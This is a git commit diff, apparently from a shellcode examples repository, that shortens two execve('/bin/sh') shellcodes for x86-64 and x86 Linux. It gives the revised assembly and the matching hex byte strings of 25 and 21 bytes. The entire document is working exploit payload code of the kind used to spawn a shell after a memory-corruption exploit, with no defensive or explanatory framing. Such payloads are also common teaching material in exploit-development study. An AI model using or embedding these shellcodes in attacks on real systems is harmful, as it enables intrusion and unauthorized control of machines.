86d326a06eab7b315d02e993a74fde02e9d0a3bd
danielhenrymantilla <daniel.henry.mantilla@gmail.com>
2017-05-11 20:02:51 +0200

    Short binsh shellcodes shortened even further

--- examples/binshx64_short.s
+++ examples/binshx64_short.s
@@ -1,15 +1,14 @@
 .text
 .globl _start
 _start:
-	xor %rax,%rax
-	movb    $0x3b,%al		 # sys_execve
-	cqo				 # env = %rdx = NULL
-	movabs $0x68732f6e69622f2f, %rdi # //bin/sh
+	xor %rsi,%rsi
+	mul %rsi
 	push %rdx			 # null-terminator byte(s)
-	push %rdi			 
+	movabs $0x68732f6e69622f2f, %rdi #
+	push %rdi			 # //bin/sh
 	mov %rsp, %rdi			 # "//bin/sh" address
-	mov %rdx, %rsi			 # argv = %rsi = NULL
+	movb $0x3b,%al			 # sys_execve
 	syscall
 
-# char shellcode[] = "\x48\x31\xc0\xb0\x3b\x48\x99\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x52\x57\x48\x89\xe7\x48\x89\xd6\x0f\x05";
-# /* Total: 27 bytes. */
+# char shellcode[] = "\x48\x31\xf6\x48\xf7\xe6\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";
+# /* Total: 25 bytes. */
--- examples/binshx86_short.s
+++ examples/binshx86_short.s
@@ -1,15 +1,14 @@
 .text
 .globl _start
 _start:
-	xorl %eax, %eax
-	movb $0xb, %al		# sys_execve
-	cdq			# env = %edx = NULL
+	xorl %ecx, %ecx		# ecx = 0
+	mul %ecx		# eax = edx = ecx = 0
 	pushl %edx		# null-terminator byte(s)
 	pushl $0x68732f2f	# //sh
 	pushl $0x6e69622f	# /bin
 	movl %esp, %ebx		# "/bin//sh" addr
-	movl %edx, %ecx		# argv = %ecx = NULL 
+	movb $0xb, %al		# sys_execve
 	int $0x80		# syscall
 
-# char shellcode[] = "\x31\xc0\xb0\x0b\x99\x52\x68//sh\x68/bin\x89\xe3\x89\xd1\xcd\x80";
-# /* Total: 22 bytes. */
+# char shellcode[] = "\x31\xc9\xf7\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
+# /* Total: 21 bytes. */
